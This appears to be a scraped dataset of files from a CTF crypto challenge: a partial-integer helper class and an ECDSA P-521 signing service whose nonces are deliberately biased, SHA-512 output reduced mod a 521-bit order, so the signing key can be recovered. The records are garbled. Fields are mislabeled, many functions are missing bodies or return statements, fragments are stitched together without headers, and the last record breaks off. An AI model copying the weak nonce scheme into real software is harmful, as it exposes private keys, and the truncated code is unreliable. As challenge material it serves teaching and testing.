\"\"\"\n\n    def __init__(self):\n        \"\"\"\n        Constructs a new PartialInteger with total bit length 0 and no components.\n        \"\"\"\n        self.bit_length = 0\n        self.unknowns = 0\n        self._components = []\n\n    def add_known(self, value, bit_length):\n        \"\"\"\n        Adds a known component to the msb of this PartialInteger.\n        :param value: the value of the component\n        :param bit_length: the bit length of the component\n        :return: this PartialInteger, with the component added to the msb\n        \"\"\"\n        self.bit_length += bit_length\n        self._components.append((value, bit_length))\n        return self\n\n    def add_unknown(self, bit_length):\n        \"\"\"\n        Adds an unknown component to the msb of this PartialInteger.\n        :param bit_length: the bit length of the compone", "solution_code": "    match = re.search(r'Signature \\(r, s\\): \\((\\d+), (\\d+)\\)', data)\n    #print(data)\n    #print(match)\n    if match:\n        return int(match.group(1)), int(match.group(2))\n    else:\n        return None\n\n\n    def __init__(self):\n        \"\"\"\n        Constructs a new PartialInteger with total bit length 0 and no components.\n        \"\"\"\n        self.bit_length = 0\n        self.unknowns = 0\n        self._components = []\n\n\n    def add_known(self, value, bit_length):\n        \"\"\"\n        Adds a known component to the msb of this PartialInteger.\n        :param value: the value of the component\n        :param bit_length: the bit length of the component\n        :return: this PartialInteger, with the component added to the msb\n        \"\"\"\n        self.bit_length += bit_length\n        self._components.append((value, bit_length))\n        return self\n\n\n    def add_unknown(self, bit_length):\n        \"\"\"\n        Adds an unknown component to the msb of this PartialInteger.\n        :param bit_length: the bit length of the component\n        :return: this PartialInteger, with the component added to the msb\n        \"\"\"\n        self.bit_length += bit_length\n        self.unknowns += 1\n        self._components.append((None, bit_length))\n        return self\n\n\n    def get_known_lsb(self):\n        \"\"\"\n        Returns all known lsb in this PartialInteger.\n        This method can cross multiple known components, but stops once an unknown component is encountered.\n        :return: a tuple containing the known lsb and the bit length of the known lsb\n        \"\"\"\n        lsb = 0\n        lsb_bit_length = 0\n        for value, bit_length in self._components:\n            if value is None:\n                return lsb, lsb_bit_length\n\n\n    def get_known_msb(self):\n        \"\"\"\n        Returns all known msb in this PartialInteger.\n        This method can cross multiple known components, but stops once an unknown component is encountered.\n        :return: a tuple containing the known msb and the bit length of the known msb\n        \"\"\"\n        msb = 0\n        msb_bit_length = 0\n        for value, bit_length in reversed(self._components):\n            if value is None:\n                return msb, msb_bit_length\n\n\n    def get_known_middle(self):\n        \"\"\"\n        Returns all known middle bits in this PartialInteger.\n        This method can cross multiple known components, but stops once an unknown component is encountered.\n        :return: a tuple containing the known middle bits and the bit length of the known middle bits\n        \"\"\"\n        middle = 0\n        middle_bit_length = 0\n        for value, bit_length in self._components:\n            if value is None:\n                if middle_bit_length > 0:\n                    return middle, middle_bit_length\n            else:\n                middle = middle + (value << middle_bit_length)\n                middle_bit_length += bit_length\n\n\n    def get_unknown_lsb(self):\n        \"\"\"\n        Returns the bit length of the unknown lsb in this PartialInteger.\n        This method can cross multiple unknown components, but stops once a known component is encountered.\n        :return: the bit length of the unknown lsb\n        \"\"\"\n        lsb_bit_length = 0\n        for value, bit_length in self._components:\n            if value is not None:\n                return lsb_bit_length\n\n\n    def get_unknown_msb(self):\n        \"\"\"\n        Returns the bit length of the unknown msb in this PartialInteger.\n        This method can cross multiple unknown components, but stops once a known component is encountered.\n        :return: the bit length of the unknown msb\n        \"\"\"\n        msb_bit_length = 0\n        for value, bit_length in reversed(self._components):\n            if value is not None:\n                return msb_bit_length\n\n\n    def get_unknown_middle(self):\n        \"\"\"\n        Returns the bit length of the unknown middle bits in this PartialInteger.\n        This method can cross multiple unknown components, but stops once a known component is encountered.\n        :return: the bit length of the unknown middle bits\n        \"\"\"\n        middle_bit_length = 0\n        for value, bit_length in self._components:\n            if value is None:\n                if middle_bit_length > 0:\n                    return middle_bit_length\n            else:\n                middle_bit_length += bit_length\n\n\n    def matches(self, i):\n        \"\"\"\n        Returns whether this PartialInteger matches an integer, that is, all known bits are equal.\n        :param i: the integer\n        :return: True if this PartialInteger matches i, False otherwise\n        \"\"\"\n        shift = 0\n        for value, bit_length in self._components:\n            if value is not None and (i >> shift) % (2 ** bit_length) != value:\n                return False\n\n\n    def sub(self, unknowns):\n        \"\"\"\n        Substitutes some values for the unknown components in this PartialInteger.\n        These values can be symbolic (e.g. Sage variables)\n        :param unknowns: the unknowns\n        :return: an integer or expression with the unknowns substituted\n        \"\"\"\n        assert len(unknowns) == self.unknowns\n        i = 0\n        j = 0\n        shift = 0\n        for value, bit_length in self._components:\n            if value is None:\n                # We don't shift here because the unknown could be a symbolic variable\n                i += 2 ** shift * unknowns[j]\n                j += 1\n            else:\n                i += value << shift\n\n\n    def get_known_and_unknowns(self):\n        \"\"\"\n        Returns i_, o, and l such that this integer i = i_ + sum(2^(o_j) * i_j) with i_j < 2^(l_j).\n        :return: a tuple of i_, o, and l\n        \"\"\"\n        i_ = 0\n        o = []\n        l = []\n        offset = 0\n        for value, bit_length in self._components:\n            if value is None:\n                o.append(offset)\n                l.append(bit_length)\n            else:\n                i_ += 2 ** offset * value\n\n\n    def get_unknown_bounds(self):\n        \"\"\"\n        Returns a list of bounds on each of the unknowns in this PartialInteger.\n        A bound is simply 2^l with l the bit length of the unknown.\n        :return: the list of bounds\n        \"\"\"\n        return [2 ** bit_length for value, bit_length in self._components if value is None]\n\n\n    def to_int(self):\n        \"\"\"\n        Converts this PartialInteger to an int.\n        The number of unknowns must be zero.\n        :return: the int represented by this PartialInteger\n        \"\"\"\n        assert self.unknowns == 0\n        return self.sub([])\n\n\n    def to_string_le(self, base, symbols=\"0123456789abcdefghijklmnopqrstuvwxyz\"):\n        \"\"\"\n        Converts this PartialInteger to a list of characters in the provided base (little endian).\n        :param base: the base, must be a power of two and less than or equal to 36\n        :param symbols: the symbols to use, at least as many as base (default: \"0123456789abcdefghijklmnopqrstuvwxyz\")\n        :return: the list of characters, with '?' representing an unknown digit\n        \"\"\"\n        assert (base & (base - 1)) == 0, \"Base must be power of two.\"\n        assert base <= 36\n        assert len(symbols) >= base\n        bits_per_element = int(log2(base))\n        chars = []\n        for value, bit_length in self._components:\n            assert bit_length % bits_per_element == 0, f\"Component with bit length {bit_length} can't be represented by base {base} digits\"\n            for _ in range(bit_length // bits_per_element):\n                if value is None:\n                    chars.append('?')\n                else:\n                    chars.append(symbols[value % base])\n                    value //= base\n\n\n    def to_string_be(self, base, symbols=\"0123456789abcdefghijklmnopqrstuvwxyz\"):\n        \"\"\"\n        Converts this PartialInteger to a list of characters in the provided base (big endian).\n        :param base: the base, must be a power of two and less than or equal to 36\n        :param symbols: the symbols to use, at least as many as base (default: \"0123456789abcdefghijklmnopqrstuvwxyz\")\n        :return: the list of characters, with '?' representing an unknown digit\n        \"\"\"\n        return self.to_string_le(base, symbols)[::-1]\n\n\n    def to_bits_le(self, symbols=\"01\"):\n        \"\"\"\n        Converts this PartialInteger to a list of bit characters (little endian).\n        :param symbols: the two symbols to use (default: \"01\")\n        :return: the list of bit characters, with '?' representing an unknown bit\n        \"\"\"\n        assert len(symbols) == 2\n        return self.to_string_le(2, symbols)\n\n\n    def to_bits_be(self, symbols=\"01\"):\n        \"\"\"\n        Converts this PartialInteger to a list of bit characters (big endian).\n        :param symbols: the two symbols to use (default: \"01\")\n        :return: the list of bit characters, with '?' representing an unknown bit\n        \"\"\"\n        return self.to_bits_le(symbols)[::-1]\n\n\n    def to_hex_le(self, symbols=\"0123456789abcdef\"):\n        \"\"\"\n        Converts this PartialInteger to a list of hex characters (little endian).\n        :param symbols: the 16 symbols to use (default: \"0123456789abcdef\")\n        :return: the list of hex characters, with '?' representing an unknown nibble\n        \"\"\"\n        assert len(symbols) == 16\n        return self.to_string_le(16, symbols)\n\n\n    def to_hex_be(self, symbols=\"0123456789abcdef\"):\n        \"\"\"\n        Converts this PartialInteger to a list of hex characters (big endian).\n        :param symbols: the 16 symbols to use (default: \"0123456789abcdef\")\n        :return: the list of hex characters, with '?' representing an unknown nibble\n        \"\"\"\n        return self.to_hex_le(symbols)[::-1]\n\n\n    @staticmethod\n    def unknown(bit_length):\n        return PartialInteger().add_unknown(bit_length)\n\n\n    @staticmethod\n    def parse_le(digits, base):\n        \"\"\"\n        Constructs a PartialInteger from arbitrary digits in a provided base (little endian).\n        :param digits: the digits (string with '?' representing unknown or list with '?'/None representing unknown)\n        :param base: the base, must be a power of two and less than or equal to 36\n        :return: a PartialInteger with known and unknown components as indicated by the digits\n        \"\"\"\n        assert (base & (base - 1)) == 0, \"Base must be power of two.\"\n        assert base <= 36\n        bits_per_element = int(log2(base))\n        p = PartialInteger()\n        rc_k = 0\n        rc_u = 0\n        value = 0\n        for digit in digits:\n            if digit is None or digit == '?':\n                if rc_k > 0:\n                    p.add_known(value, rc_k * bits_per_element)\n                    rc_k = 0\n                    value = 0\n                rc_u += 1\n            else:\n                if isinstance(digit, str):\n                    digit = int(digit, base)\n                assert 0 <= digit < base\n                if rc_u > 0:\n                    p.add_unknown(rc_u * bits_per_element)\n                    rc_u = 0\n                value += digit * base ** rc_k\n                rc_k += 1\n\n\n    @staticmethod\n    def parse_be(digits, base):\n        \"\"\"\n        Constructs a PartialInteger from arbitrary digits in a provided base (big endian).\n        :param digits: the digits (string with '?' representing unknown or list with '?'/None representing unknown)\n        :param base: the base (must be a power of two and less than or equal to 36)\n        :return: a PartialInteger with known and unknown components as indicated by the digits\n        \"\"\"\n        return PartialInteger.parse_le(reversed(digits), base)\n\n\n    @staticmethod\n    def from_bits_le(bits):\n        \"\"\"\n        Constructs a PartialInteger from bits (little endian).\n        :param bits: the bits (string with '?' representing unknown or list with '?'/None representing unknown)\n        :return: a PartialInteger with known and unknown components as indicated by the bits\n        \"\"\"\n        return PartialInteger.parse_le(bits, 2)\n\n\n    @staticmethod\n    def from_bits_be(bits):\n        \"\"\"\n        Constructs a PartialInteger from bits (big endian).\n        :param bits: the bits (string with '?' representing unknown or list with '?'/None representing unknown)\n        :return: a PartialInteger with known and unknown components as indicated by the bits\n        \"\"\"\n        return PartialInteger.from_bits_le(reversed(bits))\n\n\n    @staticmethod\n    def from_hex_le(hex):\n        \"\"\"\n        Constructs a PartialInteger from hex characters (little endian).\n        :param hex: the hex characters (string with '?' representing unknown or list with '?'/None representing unknown)\n        :return: a PartialInteger with known and unknown components as indicated by the hex characters\n        \"\"\"\n        return PartialInteger.parse_le(hex, 16)\n\n\n    @staticmethod\n    def from_hex_be(hex):\n        \"\"\"\n        Constructs a PartialInteger from hex characters (big endian).\n        :param hex: the hex characters (string with '?' representing unknown or list with '?'/None representing unknown)\n        :return: a PartialInteger with known and unknown components as indicated by the hex characters\n        \"\"\"\n        return PartialInteger.from_hex_le(reversed(hex))\n\n\n    @staticmethod\n    def from_lsb(bit_length, lsb, lsb_bit_length):\n        \"\"\"\n        Constructs a PartialInteger from some known lsb, setting the msb to unknown.\n        :param bit_length: the total bit length of the integer\n        :param lsb: the known lsb\n        :param lsb_bit_length: the bit length of the known lsb\n        :return: a PartialInteger with one known component (the lsb) and one unknown component (the msb)\n        \"\"\"\n        assert bit_length >= lsb_bit_length\n        assert 0 <= lsb <= (2 ** lsb_bit_length)\n        return PartialInteger().add_known(lsb, lsb_bit_length).add_unknown(bit_length - lsb_bit_length)\n\n\n    @staticmethod\n    def from_msb(bit_length, msb, msb_bit_length):\n        \"\"\"\n        Constructs a PartialInteger from some known msb, setting the lsb to unknown.\n        :param bit_length: the total bit length of the integer\n        :param msb: the known msb\n        :param msb_bit_length: the bit length of the known msb\n        :return: a PartialInteger with one known component (the msb) and one unknown component (the lsb)\n        \"\"\"\n        assert bit_length >= msb_bit_length\n        assert 0 <= msb < (2 ** msb_bit_length)\n        return PartialInteger().add_unknown(bit_length - msb_bit_length).add_known(msb, msb_bit_length)\n\n\n    @staticmethod\n    def from_lsb_and_msb(bit_length, lsb, lsb_bit_length, msb, msb_bit_length):\n        \"\"\"\n        Constructs a PartialInteger from some known lsb and msb, setting the middle bits to unknown.\n        :param bit_length: the total bit length of the integer\n        :param lsb: the known lsb\n        :param lsb_bit_length: the bit length of the known lsb\n        :param msb: the known msb\n        :param msb_bit_length: the bit length of the known msb\n        :return: a PartialInteger with two known components (the lsb and msb) and one unknown component (the middle bits)\n        \"\"\"\n        assert bit_length >= lsb_bit_length + msb_bit_length\n        assert 0 <= lsb < (2 ** lsb_bit_length)\n        assert 0 <= msb < (2 ** msb_bit_length)\n        middle_bit_length = bit_length - lsb_bit_length - msb_bit_length\n        return PartialInteger().add_known(lsb, lsb_bit_length).add_unknown(middle_bit_length).add_known(msb, msb_bit_length)\n\n\n    @staticmethod\n    def from_middle(middle, middle_bit_length, lsb_bit_length, msb_bit_length):\n        \"\"\"\n        Constructs a PartialInteger from some known middle bits, setting the lsb and msb to unknown.\n        :param middle: the known middle bits\n        :param middle_bit_length: the bit length of the known middle bits\n        :param lsb_bit_length: the bit length of the unknown lsb\n        :param msb_bit_length: the bit length of the unknown msb\n        :return: a PartialInteger with one known component (the middle bits) and two unknown components (the lsb and msb)\n        \"\"\"\n        assert 0 <= middle < (2 ** middle_bit_length)\n        return PartialInteger().add_unknown(lsb_bit_length).add_known(middle, middle_bit_length).add_unknown(msb_bit_length)\n\n\n    @staticmethod\n    def lsb_of(i, bit_length, lsb_bit_length):\n        \"\"\"\n        Constructs a PartialInteger from the lsb of a known integer, setting the msb to unknown.\n        Mainly used for testing purposes.\n        :param i: the known integer\n        :param bit_length: the total length of the known integer\n        :param lsb_bit_length: the bit length of the known lsb\n        :return: a PartialInteger with one known component (the lsb) and one unknown component (the msb)\n        \"\"\"\n        lsb = i % (2 ** lsb_bit_length)\n        return PartialInteger.from_lsb(bit_length, lsb, lsb_bit_length)\n\n\n    @staticmethod\n    def msb_of(i, bit_length, msb_bit_length):\n        \"\"\"\n        Constructs a PartialInteger from the msb of a known integer, setting the lsb to unknown.\n        Mainly used for testing purposes.\n        :param i: the known integer\n        :param bit_length: the total length of the known integer\n        :param msb_bit_length: the bit length of the known msb\n        :return: a PartialInteger with one known component (the msb) and one unknown component (the lsb)\n        \"\"\"\n        msb = i >> (bit_length - msb_bit_length)\n        return PartialInteger.from_msb(bit_length, msb, msb_bit_length)\n\n\n    @staticmethod\n    def lsb_and_msb_of(i, bit_length, lsb_bit_length, msb_bit_length):\n        \"\"\"\n        Constructs a PartialInteger from the lsb and msb of a known integer, setting the middle bits to unknown.\n        Mainly used for testing purposes.\n        :param i: the known integer\n        :param bit_length: the total length of the known integer\n        :param lsb_bit_length: the bit length of the known lsb\n        :param msb_bit_length: the bit length of the known msb\n        :return: a PartialInteger with two known components (the lsb and msb) and one unknown component (the middle bits)\n        \"\"\"\n        lsb = i % (2 ** lsb_bit_length)\n        msb = i >> (bit_length - msb_bit_length)\n        return PartialInteger.from_lsb_and_msb(bit_length, lsb, lsb_bit_length, msb, msb_bit_length)\n\n\n    @staticmethod\n    def middle_of(i, bit_length, lsb_bit_length, msb_bit_length):\n        \"\"\"\n        Constructs a PartialInteger from the middle bits of a known integer, setting the lsb and msb to unknown.\n        Mainly used for testing purposes.\n        :param i: the known integer\n        :param bit_length: the total length of the known integer\n        :param lsb_bit_length: the bit length of the unknown lsb\n        :param msb_bit_length: the bit length of the unknown msb\n        :return: a PartialInteger with one known component (the middle bits) and two unknown components (the lsb and msb)\n        \"\"\"\n        middle_bit_length = bit_length - lsb_bit_length - msb_bit_length\n        middle = (i >> lsb_bit_length) % (2 ** middle_bit_length)\n        return PartialInteger.from_middle(middle, middle_bit_length, lsb_bit_length, msb_bit_length)\n", "tools": ["sage"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\crypto-on-the-rocks\\solution\\utils.py", "file_size": 23894, "scraped_at": "2025-10-26T18:20:14.369285"}
{"id": "l3ak-team_L3akCTF-2024-public_chal", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "chal", "attack_type": "AES", "writeup": "from sage.all import *\nfrom typing import Tuple\nimport hashlib\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.number import long_to_bytes\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Random import get_random_bytes\nimport re\np = 0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\nK = GF(p)\na = K(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc)\nb = K(0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00)\nE = EllipticCurve(K, (a, b))\nG = E(0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66, 0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650)\nE.set_order(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409 * 0x1)\nn = G.order()\n\n\nFLAG: str = open('flag.txt', 'r').read().strip()\nKEY: int = randint(1, n - 1)\nQ: int = KEY*G\nAES_KEY = hashlib.sha256(long_to_bytes(KEY)).digest()\n\nINVALID_ATTEMPTS = 0\n\ndef banner() -> str:\n    banner = \"\"\"\\n\n██████████╗░░█████╗░░█████╗░███████╗█\n[=] ------------ Menu------------ [=]\n[+] !1: Get Public Key            [+]\n[+] !2: Sign a message            [+]\n[+] !3: Verify a signature        [+]\n[+] !4: Get the encrypted flag    [+]\n[+] !5: Exit                      [+]\n[=] ------------------------------[=]\n██████████╗░░█████╗░░█████╗░███████╗█\n\\r\\n\"\"\"\n    return banner\ndef get_k() -> int:\n    return int.from_bytes(hashlib.sha512(os.urandom(512//8)).digest(), byteorder='big') % n\n\ndef digest(msg) -> int:\n    if isinstance(msg, str):\n        msg = msg.encode()\n    return int.from_bytes(hashlib.sha256(msg).digest(), byteorder='big')\n\n\ndef ecdsa_verify(Q, m, r, s) -> bool:\n    e = digest(m)\n    w = pow(s, -1, n)\n    u1 = int((e * w) % n)  \n    u2 = int((r * w) % n)  \n    P = (u1 * G) + (u2 * Q)\n    return r == int(P.xy()[0])\n\n\ndef ecdsa_sign(d: int, m: str) -> Tuple[int, int]:\n    e = digest(m)\n    k = get_k()\n    P = k * G\n    r_i = int(P.xy()[0])\n    s_i = (pow(k, -1, n) * (e+r_i*d)) % n\n    return (r_i, s_i)\n\ndef send_flag() -> str:\n        flag = FLAG.encode()\n        iv = get_random_bytes(16)\n        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)\n        ct = cipher.encrypt(pad(flag, AES.block_size))\n        return (iv + ct).hex()\n\ndef handle_signing() -> tuple:\n    b = banner()\n    while True:\n        try:\n            inp = input(\"Enter message to sign. (`!exit`) to return to the main menu.\\n\\n>> \")\n            if inp == \"!exit\":\n                print(b)\n                break\n            r,s = ecdsa_sign(KEY, inp)\n            print(f\"Signature (r,s): {(r, s)}\")\n            \n        except Exception as e:\n            print(f\"Error during signing: {e}\")\n            continue\n\ndef is_valid_format(inp) -> bool:\n    pattern = r\"^[^,]+,\\d+,\\d+$\"\n    match = re.match(pattern, inp)\n    return bool(match)\n\ndef handle_verfication():\n    while True:\n        inp = input(\"Enter the message you want to verify in the format `message,r,s` (`!exit` to return to the main menu).\\n\\n>> \")\n        if inp == '!exit':\n            print(\"Returning to main menu...\\n\")\n            print(banner())\n            break\n        valid = is_valid_format(inp)\n        if not valid:\n            print(\"Invalid input format. Please try again.\\n\")\n            continue\n        message, r, s = inp.split(',')\n        print(f\"message: {message}\\nr: {r}\\ns: {s}\\n\")\n        try:\n            i_r, i_s = int(r), int(s)\n            valid = ecdsa_verify(Q, message, i_r, i_s)\n            result = \"Signature is valid\\n\" if valid else \"Signature is invalid\\n\"\n            print(result)\n        except Exception as e:\n            print(f\"Error during verification: {e}\")\n            continue\n        \n\n\ndef process_option(option: str) -> str:\n    b = banner()\n    global INVALID_ATTEMPTS\n    if option == '!1':\n        INVALID_ATTEMPTS = 0\n        public_key_info = f\"Public Key (X, Y): {Q.xy()}\\n\"\n        print(public_key_info)\n        print(b)\n    elif option == '!2':\n        INVALID_ATTEMPTS = 0\n        handle_signing()\n    elif option == '!3':\n        INVALID_ATTEMPTS = 0\n        handle_verfication()\n    elif option == '!4':\n        INVALID_ATTEMPTS = 0\n        enc_flag = send_flag()\n        print(f\"Encrypted Flag: {enc_flag}\\n\")\n    elif option == '!5':\n        print(\"Goodbye!\\n\")\n        return False\n    else:\n        INVALID_ATTEMPTS += 1\n        print(\"Invalid option... Try again\\n\")\n        if INVALID_ATTEMPTS >= 3:\n            print(\"Too many invalid attempts. Exiting.\\n\")\n            return False\n    return True\n        \n\n\n\ndef main():\n    try:\n        b = banner()\n        print(b+\"\\n\")\n        while True:\n            \n            inp = input", "solution_code": "    b = banner()\n    while True:\n        try:\n            inp = input(\"Enter message to sign. (`!exit`) to return to the main menu.\\n\\n>> \")\n            if inp == \"!exit\":\n                print(b)\n                break\n            r,s = ecdsa_sign(KEY, inp)\n            print(f\"Signature (r,s): {(r, s)}\")\n            \n        except Exception as e:\n            print(f\"Error during signing: {e}\")\n            continue\n\n\n    while True:\n        inp = input(\"Enter the message you want to verify in the format `message,r,s` (`!exit` to return to the main menu).\\n\\n>> \")\n        if inp == '!exit':\n            print(\"Returning to main menu...\\n\")\n            print(banner())\n            break\n        valid = is_valid_format(inp)\n        if not valid:\n            print(\"Invalid input format. Please try again.\\n\")\n            continue\n        message, r, s = inp.split(',')\n        print(f\"message: {message}\\nr: {r}\\ns: {s}\\n\")\n        try:\n            i_r, i_s = int(r), int(s)\n            valid = ecdsa_verify(Q, message, i_r, i_s)\n            result = \"Signature is valid\\n\" if valid else \"Signature is invalid\\n\"\n            print(result)\n        except Exception as e:\n            print(f\"Error during verification: {e}\")\n            continue\n        \n\n\n    b = banner()\n    global INVALID_ATTEMPTS\n    if option == '!1':\n        INVALID_ATTEMPTS = 0\n        public_key_info = f\"Public Key (X, Y): {Q.xy()}\\n\"\n        print(public_key_info)\n        print(b)\n    elif option == '!2':\n        INVALID_ATTEMPTS = 0\n        handle_signing()\n    elif option == '!3':\n        INVALID_ATTEMPTS = 0\n        handle_verfication()\n    elif option == '!4':\n        INVALID_ATTEMPTS = 0\n        enc_flag = send_flag()\n        print(f\"Encrypted Flag: {enc_flag}\\n\")\n    elif option == '!5':\n        print(\"Goodbye!\\n\")\n        return False\n    else:\n        INVALID_ATTEMPTS += 1\n        print(\"Invalid option... Try again\\n\")\n        if INVALID_ATTEMPTS >= 3:\n            print(\"Too many invalid attempts. Exiting.\\n\")\n            return False\n    return True\n        \n\n\n    try:\n        b = banner()\n        print(b+\"\\n\")\n        while True:\n            \n            inp = input(\">> \")\n            if not process_option(inp):\n                sys.exit(0)\n    except Exception as e:\n        print(f\"An error occurred: {e}, please try again later.\\n\")\n        pass\n", "tools": ["sage", "pycryptodome"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\crypto-on-the-rocks\\build\\src\\chal.py", "file_size": 5270, "scraped_at": "2025-10-26T18:20:14.388155"}
{"id": "l3ak-team_L3akCTF-2024-public_P-521_parameters_(https:__neuromancer.sk_std_nist_P-521)", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "P-521 parameters (https://neuromancer.sk/std/nist/P-521)", "attack_type": "AES", "writeup": "import socketserver, socket\nimport os\nfrom sage.all import *\nimport hashlib\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.number import long_to_bytes\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Random import get_random_bytes\n# P-521 parameters (https://neuromancer.sk/std/nist/P-521)\np = 0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\nK = GF(p)\na = K(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc)\nb = K(0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00)\nE = EllipticCurve(K, (a, b))\nG = E(0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66, 0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650)\nE.set_order(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409 * 0x1)\nn = G.order()\n\nFLAG = open('flag.txt', 'r').read().strip()\nKEY = randint(1, n - 1)\nAES_KEY = hashlib.sha256(long_to_bytes(KEY)).digest()\nQ = KEY * G\n\n\ndef get_k() -> int:\n    return int.from_bytes(hashlib.sha512(os.urandom(512//8)).digest(), byteorder='big') % n\n\ndef digest(msg) -> int:\n    if isinstance(msg, str):\n        msg = msg.encode()\n    return int.from_bytes(hashlib.sha256(msg).digest(), byteorder='big')\n\n\ndef ecdsa_verify(Q, m, r, s) -> bool:\n    e = digest(m)\n    w = pow(s, -1, n)\n    u1 = int((e * w) % n)  \n    u2 = int((r * w) % n)  \n    P = (u1 * G) + (u2 * Q)\n    return r == int(P.xy()[0])\n\n\ndef ecdsa_sign(d, m) -> tuple:\n    e = digest(m)\n    k = get_k()\n    if k == 0:\n        raise ValueError(\"Random k generated as zero, which is invalid.\")\n    P = k * G\n    r_i = int(P.xy()[0])\n    s_i = (pow(k, -1, n) * (e + r_i * d)) % n\n    return (r_i, s_i)\n\n\n\n#██████╗███████╗██████╗░██\ndef banner() -> bytes:\n    banner = \"\"\"\n██████████╗░░█████╗░░█████╗░███████╗█\n[=] ------------ Menu------------ [=]\n[+] !1: Get Public Key            [+]\n[+] !2: Sign a message            [+]\n[+] !3: Verify a signature        [+]\n[+] !4: Get the encrypted flag    [+]\n[+] !5: Exit                      [+]\n[=] ------------------------------[=]\n██████████╗░░█████╗░░█████╗░███████╗█\n\\r\\n\"\"\"\n    return bytes(banner, 'utf-8')\n\n\nclass SimpleTCPRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        self.invalid_attempts = 0\n        self.request.settimeout(60)  # Set a timeout for client inactivity\n        \n        try:\n            self.request.sendall(banner() + b\"\\n>> \")\n            while True:\n                option = self.request.recv(1024).strip()\n                if not option:\n                    break\n                if not self.process_option(option):\n                    break\n                self.request.sendall(b\"\\n>> \")\n        except Exception as e:\n            pass  \n        finally:\n            self.request.close()\n\n    def process_option(self, option):\n        if option == b'!1':\n            self.invalid_attempts = 0\n            public_key_info = f\"Public Key (X, Y): {Q.xy()}\\n\".encode()\n            self.request.sendall(public_key_info)\n        elif option == b'!2':\n            self.invalid_attempts = 0\n            self.handle_signing()\n        elif option == b'!3':\n            self.invalid_attempts = 0\n            self.handle_verification()\n        elif option == b'!4':\n            self.invalid_attempts = 0\n            encrypted_flag = self.send_flag()\n            self.request.sendall(f\"Encrypted Flag: {encrypted_flag}\\n\".encode())\n        elif option == b'!5':\n            self.request.sendall(b\"Goodbye!\\n\")\n            self.request.close()\n        else:\n            self.invalid_attempts += 1\n            self.request.sendall(b\"Invalid option. Try again.\\n\")\n            if self.invalid_attempts >= 3:\n                self.request.sendall(b\"Too many invalid attempts. Exiting.\\n\")\n                return False\n        return True\n\n    def handle_error(self, error_message):\n        try:\n            self.request.sendall(f\"An error occurred: {error_message}, please try again later.\\n\".encode())\n        except BrokenPipeError:\n            print(\"client disconnected.\")\n\n    def handle_signing(self):\n        while True:\n            self.request.sendall(b\"\\nEnter message to sign (`!exit`) to return to main menu.\\n\\n>> \")\n            msg = self.request.recv(1024).strip().decode()\n            if msg == '!exit':\n                self.request.sendall(banner() + b\"\\n\")\n                break\n            try:\n                r, s = ecdsa_sign(KEY, msg)\n                response = f\"Signature (r, s): ({r}, {s})\\n \"\n                self.request.sendall(response.encode())\n            except Exception as e:\n                self.handle_error(str(e))\n\n    ", "solution_code": "    def handle(self):\n        self.invalid_attempts = 0\n        self.request.settimeout(60)  # Set a timeout for client inactivity\n        \n        try:\n            self.request.sendall(banner() + b\"\\n>> \")\n            while True:\n                option = self.request.recv(1024).strip()\n                if not option:\n                    break\n                if not self.process_option(option):\n                    break\n                self.request.sendall(b\"\\n>> \")\n        except Exception as e:\n            pass  \n        finally:\n            self.request.close()\n\n\n    def process_option(self, option):\n        if option == b'!1':\n            self.invalid_attempts = 0\n            public_key_info = f\"Public Key (X, Y): {Q.xy()}\\n\".encode()\n            self.request.sendall(public_key_info)\n        elif option == b'!2':\n            self.invalid_attempts = 0\n            self.handle_signing()\n        elif option == b'!3':\n            self.invalid_attempts = 0\n            self.handle_verification()\n        elif option == b'!4':\n            self.invalid_attempts = 0\n            encrypted_flag = self.send_flag()\n            self.request.sendall(f\"Encrypted Flag: {encrypted_flag}\\n\".encode())\n        elif option == b'!5':\n            self.request.sendall(b\"Goodbye!\\n\")\n            self.request.close()\n        else:\n            self.invalid_attempts += 1\n            self.request.sendall(b\"Invalid option. Try again.\\n\")\n            if self.invalid_attempts >= 3:\n                self.request.sendall(b\"Too many invalid attempts. Exiting.\\n\")\n                return False\n        return True\n\n\n    def handle_error(self, error_message):\n        try:\n            self.request.sendall(f\"An error occurred: {error_message}, please try again later.\\n\".encode())\n        except BrokenPipeError:\n            print(\"client disconnected.\")\n\n\n    def handle_signing(self):\n        while True:\n            